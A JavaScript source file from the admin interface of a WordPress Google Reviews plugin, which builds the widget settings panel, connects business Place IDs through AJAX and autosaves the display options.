const GRW_AUTOSAVE_KEYUP_TIMEOUT = 1500;
var GRW_AUTOSAVE_TIMEOUT = null;

const GRW_LANGS = [
    ['ar', 'Arabic'],
    ['bg', 'Bulgarian'],
    ['bn', 'Bengali'],
    ['ca', 'Catalan'],
    ['cs', 'Czech'],
    ['da', 'Danish'],
    ['de', 'German'],
    ['el', 'Greek'],
    ['en', 'English'],
    ['es', 'Spanish'],
    ['eu', 'Basque'],
    ['eu', 'Basque'],
    ['fa', 'Farsi'],
    ['fi', 'Finnish'],
    ['fil', 'Filipino'],
    ['fr', 'French'],
    ['gl', 'Galician'],
    ['gu', 'Gujarati'],
    ['hi', 'Hindi'],
    ['hr', 'Croatian'],
    ['hu', 'Hungarian'],
    ['id', 'Indonesian'],
    ['it', 'Italian'],
    ['iw', 'Hebrew'],
    ['ja', 'Japanese'],
    ['kn', 'Kannada'],
    ['ko', 'Korean'],
    ['lt', 'Lithuanian'],
    ['lv', 'Latvian'],
    ['ml', 'Malayalam'],
    ['mr', 'Marathi'],
    ['nl', 'Dutch'],
    ['no', 'Norwegian'],
    ['pl', 'Polish'],
    ['pt', 'Portuguese'],
    ['pt-BR', 'Portuguese (Brazil)'],
    ['pt-PT', 'Portuguese (Portugal)'],
    ['ro', 'Romanian'],
    ['ru', 'Russian'],
    ['sk', 'Slovak'],
    ['sl', 'Slovenian'],
    ['sr', 'Serbian'],
    ['sv', 'Swedish'],
    ['ta', 'Tamil'],
    ['te', 'Telugu'],
    ['th', 'Thai'],
    ['tl', 'Tagalog'],
    ['tr', 'Turkish'],
    ['uk', 'Ukrainian'],
    ['vi', 'Vietnamese'],
    ['zh', 'Chinese (Simplified)'],
    ['zh-Hant', 'Chinese (Traditional)']
];

var GRW_HTML_CONTENT = '' +

    '<div class="grw-builder-platforms grw-builder-inside">' +

        '<div class="grw-builder-connect grw-connect-google">Google Connection</div>' +
        '<div id="grw-connect-wizard" title="Easy steps to connect Google Reviews" style="display:none;">' +
            '<p>' +
                '<span>1</span> ' +
                'Find your Google place on the map below (<u class="grw-wiz-arr">Enter a location</u>) and copy found <u><b>Place ID</b></u>' +
            '</p>' +
            '<iframe src="https://geo-devrel-javascript-samples.web.app/samples/places-placeid-finder/app/dist" loading="lazy" style="width:100%;height:250px"></iframe>' +
            '<small style="font-size:13px;color:#555">If you can\'t find your place on this map, please read <a href="' + GRW_VARS.supportUrl + '&grw_tab=fig#place_id" target="_blank">this manual how to find any Google Place ID</a>.</small>' +
            '<p>' +
                '<span>2</span> ' +
                'Paste copied <u><b>Place ID</b></u> in this field and select language if needed' +
            '</p>' +
            '<p>' +
                '<input type="text" class="grw-connect-id" value="" placeholder="Place ID" />' +
                '<select class="grw-connect-lang"><option value="" selected="selected">Choose language if needed</option><option value="ar">Arabic</option><option value="bg">Bulgarian</option><option value="bn">Bengali</option><option value="ca">Catalan</option><option value="cs">Czech</option><option value="da">Danish</option><option value="de">German</option><option value="el">Greek</option><option value="en">English</option><option value="es">Spanish</option><option value="eu">Basque</option><option value="eu">Basque</option><option value="fa">Farsi</option><option value="fi">Finnish</option><option value="fil">Filipino</option><option value="fr">French</option><option value="gl">Galician</option><option value="gu">Gujarati</option><option value="hi">Hindi</option><option value="hr">Croatian</option><option value="hu">Hungarian</option><option value="id">Indonesian</option><option value="it">Italian</option><option value="iw">Hebrew</option><option value="ja">Japanese</option><option value="kn">Kannada</option><option value="ko">Korean</option><option value="lt">Lithuanian</option><option value="lv">Latvian</option><option value="ml">Malayalam</option><option value="mr">Marathi</option><option value="nl">Dutch</option><option value="no">Norwegian</option><option value="pl">Polish</option><option value="pt">Portuguese</option><option value="pt-BR">Portuguese (Brazil)</option><option value="pt-PT">Portuguese (Portugal)</option><option value="ro">Romanian</option><option value="ru">Russian</option><option value="sk">Slovak</option><option value="sl">Slovenian</option><option value="sr">Serbian</option><option value="sv">Swedish</option><option value="ta">Tamil</option><option value="te">Telugu</option><option value="th">Thai</option><option value="tl">Tagalog</option><option value="tr">Turkish</option><option value="uk">Ukrainian</option><option value="vi">Vietnamese</option><option value="zh">Chinese (Simplified)</option><option value="zh-Hant">Chinese (Traditional)</option></select>' +
            '</p>' +
            '<p><span>3</span> Click CONNECT GOOGLE button</p>' +
            '<button class="grw-connect-btn">Connect Google</button>' +
            '<small class="grw-connect-error"></small>' +
        '</div>' +
        '<div class="grw-connections"></div>' +
    '</div>' +

    '<div class="grw-connect-options">' +

        '<div class="grw-builder-inside">' +

            '<div class="grw-builder-option">' +
                'Layout' +
                '<select id="view_mode" name="view_mode">' +
                    '<option value="slider" selected="selected">Slider</option>' +
                    '<option value="grid">Grid</option>' +
                    '<option value="list">List</option>' +
                '</select>' +
            '</div>' +

        '</div>' +

        /* Common Options */
        '<div class="grw-builder-top grw-toggle">Common Options</div>' +
        '<div class="grw-builder-inside" style="display:none">' +
            '<div class="grw-builder-option">' +
                'Pagination' +
                '<input type="text" name="pagination" value="">' +
            '</div>' +
            '<div class="grw-builder-option">' +
                'Maximum characters before \'read more\' link' +
                '<input type="text" name="text_size" value="">' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="header_center" value="">' +
                    'Show rating by center' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="header_hide_photo" value="">' +
                    'Hide business photo' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="header_hide_name" value="">' +
                    'Hide business name' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="hide_based_on" value="">' +
                    'Hide \'Based on ... reviews\'' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="hide_writereview" value="">' +
                    'Hide \'review us on G\' button' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="header_hide_social" value="">' +
                    'Hide rating header, leave only reviews' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="hide_reviews" value="">' +
                    'Hide reviews, leave only rating header' +
                '</label>' +
            '</div>' +
        '</div>' +

        /* Slider Options */
        '<div class="grw-builder-top grw-toggle">Slider Options</div>' +
        '<div class="grw-builder-inside" style="display:none">' +
            '<div class="grw-builder-option">' +
                'Speed in second' +
                '<input type="text" name="slider_speed" value="" placeholder="Default: 5">' +
            '</div>' +
            '<div class="grw-builder-option">' +
                'Text height' +
                '<input type="text" name="slider_text_height" value="" placeholder="Default: 100px">' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="slider_autoplay" value="" checked>' +
                    'Auto-play' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="slider_hide_prevnext" value="">' +
                    'Hide prev & next buttons' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="slider_hide_dots" value="">' +
                    'Hide dots' +
                '</label>' +
            '</div>' +
        '</div>' +

        /* Style Options */
        '<div class="grw-builder-top grw-toggle">Style Options</div>' +
        '<div class="grw-builder-inside" style="display:none">' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="dark_theme">' +
                    'Dark background' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="hide_backgnd" value="">' +
                    'Hide reviews background' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="show_round" value="">' +
                    'Round reviews borders' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="show_shadow" value="">' +
                    'Show reviews shadow' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="centered" value="">' +
                    'Place by center (only if max-width is set)' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                'Container max-width' +
                '<input type="text" name="max_width" value="" placeholder="for instance: 300px">' +
                '<small>Be careful: this will make reviews unresponsive</small>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                'Container max-height' +
                '<input type="text" name="max_height" value="" placeholder="for instance: 500px">' +
            '</div>' +
        '</div>' +

        /* Advance Options */
        '<div class="grw-builder-top grw-toggle">Advance Options</div>' +
        '<div class="grw-builder-inside" style="display:none">' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="lazy_load_img" checked>' +
                    'Lazy load images' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="google_def_rev_link">' +
                    'Use default Google reviews link' +
                '</label>' +
                '<span class="grw-quest grw-quest-top grw-toggle" title="Click to help">?</span>' +
                '<div class="grw-quest-help" style="display:none;">If the direct link to all reviews <b>https://search.google.com/local/reviews?placeid=&lt;PLACE_ID&gt;</b> does not work with your Google place (leads to 404), please use this option to use the default reviews link to Google map.</div>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="open_link" checked>' +
                    'Open links in new Window' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="nofollow_link" checked>' +
                    'Use no follow links' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                'Reviewer avatar size' +
                '<select name="reviewer_avatar_size">' +
                    '<option value="56" selected="selected">Small: 56px</option>' +
                    '<option value="128">Medium: 128px</option>' +
                    '<option value="256">Large: 256px</option>' +
                '</select>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                'Cache data' +
                '<select name="cache">' +
                    '<option value="1">1 Hour</option>' +
                    '<option value="3">3 Hours</option>' +
                    '<option value="6">6 Hours</option>' +
                    '<option value="12" selected="selected">12 Hours</option>' +
                    '<option value="24">1 Day</option>' +
                    '<option value="48">2 Days</option>' +
                    '<option value="168">1 Week</option>' +
                    '<option value="">Disable (NOT recommended)</option>' +
                '</select>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                'Reviews limit' +
                '<input type="text" name="reviews_limit" value="">' +
            '</div>' +
        '</div>' +

    '</div>';

function grw_builder_init($, data) {

    var el = document.querySelector(data.el);
    if (!el) return;

    el.innerHTML = GRW_HTML_CONTENT;

    var $connect_wizard_el = $('#grw-connect-wizard');
        //connect_google_el = el.querySelector('.grw-connect-google-inside'),
        //google_pid_el = el.querySelector('.grw-connect-id');

    if (data.conns && data.conns.connections && data.conns.connections.length) {
        grw_deserialize_connections($, el, data);
    } else {
        $('.grw-connect-google').hide();
        $connect_wizard_el.dialog({
            modal: true,
            width: '50%',
            maxWidth: '600px',
            closeOnEscape: false,
            open: function() { $(".ui-dialog-titlebar-close").hide() }
        });
        //connect_google_el.style = '';
        //google_pid_el.focus();
    }

    // Google Connect
    grw_connection($, /*connect_google_el*/$connect_wizard_el[0], 'google', data.authcode);

    $('.grw-connect-options input[type="text"],.grw-connect-options textarea').keyup(function() {
        clearTimeout(GRW_AUTOSAVE_TIMEOUT);
        GRW_AUTOSAVE_TIMEOUT = setTimeout(grw_serialize_connections, GRW_AUTOSAVE_KEYUP_TIMEOUT);
    });
    $('.grw-connect-options input[type="checkbox"],.grw-connect-options select').change(function() {
        grw_serialize_connections();
    });

    $('.grw-toggle', el).unbind('click').click(function () {
        $(this).toggleClass('toggled');
        $(this).next().slideToggle();
    });

    $('.grw-builder-connect.grw-connect-google').click(function () {
        //google_pid_el.focus();
        $connect_wizard_el.dialog({modal: true, width: '50%', maxWidth: '600px'});
    });

    if ($('.grw-connections').sortable) {
        $('.grw-connections').sortable({
            stop: function(event, ui) {
                grw_serialize_connections();
            }
        });
        $('.grw-connections').disableSelection();
    }

    $('.wp-review-hide').click(function() {
        grw_review_hide($(this));
        return false;
    });

    $('#grw_save').click(function() {
        //grw_feed_save_ajax();
        grw_serialize_connections();
        return false;
    });

    window.addEventListener('beforeunload', function(e) {
        if (!GRW_AUTOSAVE_TIMEOUT) return undefined;

        var msg = 'It looks like you have been editing something. If you leave before saving, your changes will be lost.';
        (e || window.event).returnValue = msg;
        return msg;
    });
}

function grw_feed_save_ajax() {
    if (!window.grw_title.value) {
        window.grw_title.focus();
        return false;
    }

    window.grw_save.innerText = 'Auto save, wait';
    window.grw_save.disabled = true;

    jQuery.post(ajaxurl, {

        post_id   : window.grw_post_id.value,
        title     : window.grw_title.value,
        content   : document.getElementById('grw-builder-connection').value,
        action    : 'grw_feed_save_ajax',
        grw_nonce : jQuery('#grw_nonce').val()

    }, function(res) {

        var wpgr = document.querySelectorAll('.wp-gr');
        for (var i = 0; i < wpgr.length; i++) {
            wpgr[i].parentNode.removeChild(wpgr[i]);
        }

        window.grw_collection_preview.innerHTML = res;

        jQuery('.wp-review-hide').unbind('click').click(function() {
            grw_review_hide(jQuery(this));
            return false;
        });

        if (!window.grw_post_id.value) {
            var post_id = document.querySelector('.wp-gr').getAttribute('data-id');
            window.grw_post_id.value = post_id;
            window.location.href = window.location.href + '&grw_feed_id=' + post_id + '&grw_feed_new=1';
        } else {
            var $rateus = jQuery('#grw-rate_us');
            if ($rateus.length && !$rateus.hasClass('grw-flash-visible')) {
                $rateus.addClass('grw-flash-visible');
            }
        }

        window.grw_save.innerText = 'Save & Update';
        window.grw_save.disabled = false;
        GRW_AUTOSAVE_TIMEOUT = null;
    });
}

function grw_feed_save() {
    if (!window.grw_title.value) {
        window.grw_title.focus();
        return false;
    }

    var content = document.getElementById('grw-builder-connection').value;
    if (content) {
        var json = JSON.parse(content)
        if (json) {
            if (json.connections && json.connections.length) {
                return true;
            }
        }
    }

    alert("Please click 'CONNECT GOOGLE' and connect your Google reviews then save this widget");
    return false;
}

function grw_review_hide($this) {

    jQuery.post(ajaxurl, {

        id          : $this.attr('data-id'),
        feed_id     : jQuery('input[name="grw_feed[post_id]"]').val(),
        grw_wpnonce : jQuery('#grw_nonce').val(),
        action      : 'grw_hide_review'

    }, function(res) {
        var parent = $this.parent().parent();
        if (res.hide) {
            $this.text('show review');
            parent.addClass('wp-review-hidden');
        } else {
            $this.text('hide review');
            parent.removeClass('wp-review-hidden');
        }
    }, 'json');
}

function grw_connection($, el, platform, authcode) {
    var connect_btn = el.querySelector('.grw-connect-btn');
    $(connect_btn).click(function() {

        var connect_id_el = el.querySelector('.grw-connect-id');
            //connect_key_el = el.querySelector('.grw-connect-key');

        if (!connect_id_el.value) {
            connect_id_el.focus();
            return false;
        }/* else if (!connect_key_el.value) {
            connect_key_el.focus();
            return false;
        }*/

        var id = (platform == 'yelp' ? /.+\/biz\/(.*?)(\?|\/|$)/.exec(connect_id_el.value)[1] : connect_id_el.value),
            lang = el.querySelector('.grw-connect-lang').value;
            //key = connect_key_el.value;

        connect_btn.innerHTML = 'Please wait...';
        connect_btn.disabled = true;

        grw_connect_ajax($, el, {id: id, lang: lang, platform: platform, local_img: true}, authcode, 1);
        return false;
    });
}

function grw_connect_ajax($, el, params, authcode, attempt) {

    var platform = params.platform,
        connect_btn = el.querySelector('.grw-connect-btn');

    window.grw_save.innerText = 'Auto save, wait';
    window.grw_save.disabled = true;

    $.post(ajaxurl, {

        id          : decodeURIComponent(params.id),
        lang        : params.lang,
        local_img   : params.local_img,
        feed_id     : $('input[name="grw_feed[post_id]"]').val(),
        grw_wpnonce : $('#grw_nonce').val(),
        action      : 'grw_connect_google',
        v           : new Date().getTime()

    }, function(res) {

        console.log('grw_connect_debug:', res);

        connect_btn.innerHTML = 'Connect ' + (platform.charAt(0).toUpperCase() + platform.slice(1));
        connect_btn.disabled = false;

        var error_el = el.querySelector('.grw-connect-error');

        if (res.status == 'success') {

            error_el.innerHTML = '';

            try { $('#grw-connect-wizard').dialog('close'); } catch (e) {}

            var connection_params = {
                id        : res.result.id,
                lang      : params.lang,
                name      : res.result.name,
                photo     : res.result.photo,
                refresh   : true,
                local_img : params.local_img,
                platform  : platform,
                props     : {
                    default_photo : res.result.photo
                }
            };

            grw_connection_add($, el, connection_params, authcode);
            grw_serialize_connections();

        } else {

            switch (res.result.error_message) {

                case 'usage_limit':
                    $('#dialog').dialog({width: '50%', maxWidth: '600px'});
                    break;

                case 'bot_check':
                    if (attempt > 1) {
                        return;
                    }
                    grw_popup('https://app.richplugins.com/gpaw/botcheck?authcode=' + authcode, 640, 480, function() {
                        grw_connect_ajax($, el, params, authcode, attempt + 1);
                    });
                    break;

                default:
                    if (res.result.error_message.indexOf('The provided Place ID is no longer valid') >= 0) {
                        error_el.innerHTML = 'It seems Google place which you are trying to connect ' +
                            'does not have a physical address (it\'s virtual or service area), ' +
                            'unfortunately, Google Places API does not support such locations, it\'s a limitation of Google, not the plugin.<br><br>' +
                            'However, you can try to connect your Google reviews in our new cloud service ' +
                            '<a href="https://trust.reviews" target="_blank">Trust.Reviews</a> ' +
                            'and show it on your WordPress site through universal <b>HTML/JavaScript</b> code.';
                    } else {
                        error_el.innerHTML = '<b>Error</b>: ' + res.result.error_message;
                    }
            }
        }

    }, 'json');
}

function grw_connection_add($, el, conn, authcode, checked) {

    var connected_id = grw_connection_id(conn),
        connected_el = $('#' + connected_id);

    if (!connected_el.length) {
        connected_el = $('<div class="grw-connection"></div>')[0];
        connected_el.id = connected_id;
        if (conn.lang != undefined) {
            connected_el.setAttribute('data-lang', conn.lang);
        }
        connected_el.setAttribute('data-platform', conn.platform);
        connected_el.innerHTML = grw_connection_render(conn, checked);

        var connections_el = $('.grw-connections')[0];
        connections_el.appendChild(connected_el);

        jQuery('.grw-toggle', connected_el).unbind('click').click(function () {
            jQuery(this).toggleClass('toggled');
            jQuery(this).next().slideToggle();
        });

        var file_frame;
        jQuery('.grw-connect-photo-change', connected_el).on('click', function(e) {
            e.preventDefault();
            grw_upload_photo(connected_el, file_frame, function() {
                grw_serialize_connections();
            });
            return false;
        });

        jQuery('.grw-connect-photo-default', connected_el).on('click', function(e) {
            grw_change_photo(connected_el, conn.props.default_photo);
            grw_serialize_connections();
            return false;
        });

        $('input[type="text"]', connected_el).keyup(function() {
            clearTimeout(GRW_AUTOSAVE_TIMEOUT);
            GRW_AUTOSAVE_TIMEOUT = setTimeout(grw_serialize_connections, GRW_AUTOSAVE_KEYUP_TIMEOUT);
        });

        $('input[type="checkbox"]', connected_el).click(function() {
            grw_serialize_connections();
        });

        $('select.grw-connect-lang', connected_el).change(function() {
            conn.lang = this.value;
            connected_el.id = grw_connection_id(conn);
            connected_el.setAttribute('data-lang', this.value);
            grw_connect_ajax($, el, conn, authcode, 1);
            return false;
        });

        $('input[name="local_img"]', connected_el).unbind('click').click(function() {
            conn.local_img = this.checked;
            grw_connect_ajax($, el, conn, authcode, 1);
        });

        $('.grw-connect-reconnect', connected_el).click(function() {
            grw_connect_ajax($, el, conn, authcode, 1);
            return false;
        });

        $('.grw-connect-delete', connected_el).click(function() {
            if (confirm('Are you sure to delete this business?')) {
                $(connected_el).remove();
                grw_serialize_connections();
            }
            return false;
        });
    }
}

function grw_connection_id(conn) {
    var id = 'grw-' + conn.platform + '-' + conn.id.replace(/\//g, '');
    if (conn.lang != null) {
        id += conn.lang;
    }
    return id;
}

function grw_connection_render(conn, checked) {
    var name = conn.name;
    if (conn.lang) {
        name += ' (' + conn.lang + ')';
    }

    conn.photo = conn.photo || 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

    var option = document.createElement('option');
    if (conn.platform == 'google' && conn.props && conn.props.place_id) {
        option.value = conn.props.place_id;
    } else {
        option.value = conn.id;
    }
    option.text = grw_capitalize(conn.platform) + ': ' + conn.name;

    return '' +
        '<div class="grw-toggle grw-builder-connect grw-connect-business">' +
            '<input type="checkbox" class="grw-connect-select" onclick="event.stopPropagation();" ' + (checked?'checked':'') + ' /> ' +
            name + (conn.address ? ' (' + conn.address + ')' : '') +
        '</div>' +
        '<div style="display:none">' +
            (function(props) {
                var result = '';
                for (prop in props) {
                    if (prop != 'platform' && Object.prototype.hasOwnProperty.call(props, prop)) {
                        result += '<input type="hidden" name="' + prop + '" value="' + props[prop] + '" class="grw-connect-prop" readonly />';
                    }
                }
                return result;
            })(conn.props) +
            '<input type="hidden" name="id" value="' + conn.id + '" readonly />' +
            (conn.address ? '<input type="hidden" name="address" value="' + conn.address + '" readonly />' : '') +
            (conn.access_token ? '<input type="hidden" name="access_token" value="' + conn.access_token + '" readonly />' : '') +
            '<div class="grw-builder-option">' +
                '<img src="' + conn.photo + '" alt="' + conn.name + '" class="grw-connect-photo">' +
                '<a href="#" class="grw-connect-photo-change">Change</a>' +
                '<a href="#" class="grw-connect-photo-default">Default</a>' +
                '<input type="hidden" name="photo" class="grw-connect-photo-hidden" value="' + conn.photo + '" tabindex="2"/>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<input type="text" name="name" value="' + conn.name + '" />' +
            '</div>' +
            (conn.website != undefined ?
            '<div class="grw-builder-option">' +
                '<input type="text" name="website" value="' + conn.website + '" />' +
            '</div>'
            : '' ) +
            (conn.lang != undefined ?
            '<div class="grw-builder-option">' +
                //'<input type="text" name="lang" value="' + conn.lang + '" placeholder="Default language (English)" />' +
                grw_lang('Show all connected languages', conn.lang) +
            '</div>'
            : '' ) +
            (conn.review_count != undefined ?
            '<div class="grw-builder-option">' +
                '<input type="text" name="review_count" value="' + conn.review_count + '" placeholder="Total number of reviews" />' +
                '<span class="grw-quest grw-toggle" title="Click to help">?</span>' +
                '<div class="grw-quest-help">Google return only 5 most helpful reviews and does not return information about total number of reviews and you can type here it manually.</div>' +
            '</div>'
            : '' ) +
            (conn.refresh != undefined ?
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="refresh" ' + (conn.refresh ? 'checked' : '') + '>' +
                    'Update reviews daily' +
                '</label>' +
                '<span class="grw-quest grw-quest-top grw-toggle" title="Click to help">?</span>' +
                '<div class="grw-quest-help">' +
                    (conn.platform == 'google' ? 'The plugin uses the Google Places API to get your reviews. <b>The API only returns the 5 most helpful reviews (it\'s a limitation of Google, not the plugin)</b>. This option calls the Places API once in 24 hours (to keep the plugin\'s free and avoid a Google Billing) to check for a new reviews and if there are, adds to the plugin. Thus slowly building up a database of reviews.<br><br>Also if you see the new reviews on Google map, but after some time it\'s not added to the plugin, it means that Google does not include these reviews to the API and the plugin can\'t get this.<br><br>If you need to show <b>all reviews</b>, please use <a href="https://richplugins.com/business-reviews-bundle-wordpress-plugin?promo=GRGROW23" target="_blank">Business plugin</a> which uses a Google My Business API without API key and billing.' : '') +
                    (conn.platform == 'yelp' ? 'The plugin uses the Yelp API to get your reviews. <b>The API only returns the 3 most helpful reviews without sorting possibility.</b> When Yelp changes the 3 most helpful the plugin will automatically add the new one to your database. Thus slowly building up a database of reviews.' : '') +
                '</div>' +
            '</div>'
            : '' ) +
            '<div class="grw-builder-option">' +
                '<label>' +
                    '<input type="checkbox" name="local_img" ' + (conn.local_img ? 'checked' : '') + '>' +
                    'Save images locally (GDPR)' +
                '</label>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<button class="grw-connect-reconnect">Reconnect</button>' +
            '</div>' +
            '<div class="grw-builder-option">' +
                '<button class="grw-connect-delete">Delete connection</button>' +
            '</div>' +
        '</div>';
}

function grw_serialize_connections() {

    var connections = [],
        connections_el = document.querySelectorAll('.grw-connection');

    for (var i in connections_el) {
        if (Object.prototype.hasOwnProperty.call(connections_el, i)) {

            var select_el = connections_el[i].querySelector('.grw-connect-select');
            if (select_el && !grw_is_hidden(select_el) && !select_el.checked) {
                continue;
            }

            var connection = {},
                lang       = connections_el[i].getAttribute('data-lang'),
                platform   = connections_el[i].getAttribute('data-platform'),
                inputs     = connections_el[i].querySelectorAll('input');

            //connections[platform] = connections[platform] || [];

            if (lang != undefined) {
                connection.lang = lang;
            }

            for (var j in inputs) {
                if (Object.prototype.hasOwnProperty.call(inputs, j)) {
                    var input = inputs[j],
                        name = input.getAttribute('name');

                    if (!name) continue;

                    if (input.className == 'grw-connect-prop') {
                        connection.props = connection.props || {};
                        connection.props[name] = input.value;
                    } else {
                        connection[name] = (input.type == 'checkbox' ? input.checked : input.value);
                    }
                }
            }
            connection.platform = platform;
            connections.push(connection);
        }
    }

    var options = {},
        options_el = document.querySelector('.grw-connect-options').querySelectorAll('input[name],select,textarea');

    for (var o in options_el) {
        if (Object.prototype.hasOwnProperty.call(options_el, o)) {
            var input = options_el[o],
                name  = input.getAttribute('name');

            if (input.type == 'checkbox') {
                options[name] = input.checked;
            } else if (input.value != undefined) {
                options[name] = (
                                    input.type == 'textarea'     ||
                                    name       == 'word_filter'  ||
                                    name       == 'word_exclude' ?
                                    encodeURIComponent(input.value) : input.value
                                );
            }
        }
    }

    document.getElementById('grw-builder-connection').value = JSON.stringify({connections: connections, options: options});

    if (connections.length) {
        var first = connections[0],
            title = window.grw_title.value;

        if (!title) {
            window.grw_title.value = first.name;
        }
        grw_feed_save_ajax();
    } else {
        /*var connect_google_el = document.querySelector('.grw-connect-google-inside'),
            google_pid_el = document.querySelector('.grw-connect-id');

        connect_google_el.style = '';
        google_pid_el.focus();*/
    }
}

function grw_deserialize_connections($, el, data) {
    var connections = data.conns,
        options = connections.options;

    if (Array.isArray(connections.connections)) {
        connections = connections.connections;
    } else {
        var temp_conns = [];
        if (Array.isArray(connections.google)) {
            for (var c = 0; c < connections.google.length; c++) {
                connections.google[c].platform = 'google';
            }
            temp_conns = temp_conns.concat(connections.google);
        }
        if (Array.isArray(connections.facebook)) {
            for (var c = 0; c < connections.facebook.length; c++) {
                connections.facebook[c].platform = 'facebook';
            }
            temp_conns = temp_conns.concat(connections.facebook);
        }
        if (Array.isArray(connections.yelp)) {
            for (var c = 0; c < connections.yelp.length; c++) {
                connections.yelp[c].platform = 'yelp';
            }
            temp_conns = temp_conns.concat(connections.yelp);
        }
        connections = temp_conns;
    }

    for (var i = 0; i < connections.length; i++) {
        grw_connection_add($, el.querySelector('.grw-builder-platforms'), connections[i], data.authcode, true);
    }

    for (var opt in options) {
        if (Object.prototype.hasOwnProperty.call(options, opt)) {
            var control = el.querySelector('input[name="' + opt + '"],select[name="' + opt + '"],textarea[name="' + opt + '"]');
            if (control) {
                var name = control.getAttribute('name');
                if (typeof(options[opt]) === 'boolean') {
                    control.checked = options[opt];
                } else {
                    control.value = (
                                        control.type == 'textarea'     ||
                                        name         == 'word_filter'  ||
                                        name         == 'word_exclude' ?
                                        decodeURIComponent(options[opt]) : options[opt]
                                    );
                    if (opt.indexOf('_photo') > -1 && control.value) {
                        control.parentNode.querySelector('img').src = control.value;
                    }
                }
            }
        }
    }
}

function grw_upload_photo(el, file_frame, cb) {
    if (file_frame) {
        file_frame.open();
        return;
    }

    file_frame = wp.media.frames.file_frame = wp.media({
        title: jQuery(this).data('uploader_title'),
        button: {text: jQuery(this).data('uploader_button_text')},
        multiple: false
    });

    file_frame.on('select', function() {
        var attachment = file_frame.state().get('selection').first().toJSON();
        grw_change_photo(el, attachment.url);
        cb && cb(attachment.url);
    });
    file_frame.open();
}

function grw_change_photo(el, photo_url) {
    var place_photo_hidden = jQuery('.grw-connect-photo-hidden', el),
        place_photo_img = jQuery('.grw-connect-photo', el);

    place_photo_hidden.val(photo_url);
    place_photo_img.attr('src', photo_url);
    place_photo_img.show();

    grw_serialize_connections();
}

function grw_popup(url, width, height, cb) {
    var top = top || (screen.height/2)-(height/2),
        left = left || (screen.width/2)-(width/2),
        win = window.open(url, '', 'location=1,status=1,resizable=yes,width='+width+',height='+height+',top='+top+',left='+left);
    function check() {
        if (!win || win.closed != false) {
            cb();
        } else {
            setTimeout(check, 100);
        }
    }
    setTimeout(check, 100);
}

function grw_randstr(len) {
   var result = '',
       chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
       charsLen = chars.length;
   for ( var i = 0; i < len; i++ ) {
      result += chars.charAt(Math.floor(Math.random() * charsLen));
   }
   return result;
}

function grw_is_hidden(el) {
    return el.offsetParent === null;
}

function grw_capitalize(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
}

function grw_lang(defname, lang) {
    var html = '';
    for (var i = 0; i < GRW_LANGS.length; i++) {
        html += '<option value="' + GRW_LANGS[i][0] + '"' + (lang == GRW_LANGS[i][0] ? ' selected="selected"' : '') + '>' + GRW_LANGS[i][1] + '</option>';
    }
    return '<select class="grw-connect-lang" name="lang">' +
               '<option value=""' + (lang ? '' : ' selected="selected"') + '>' + defname + '</option>' +
               html +
           '</select>';
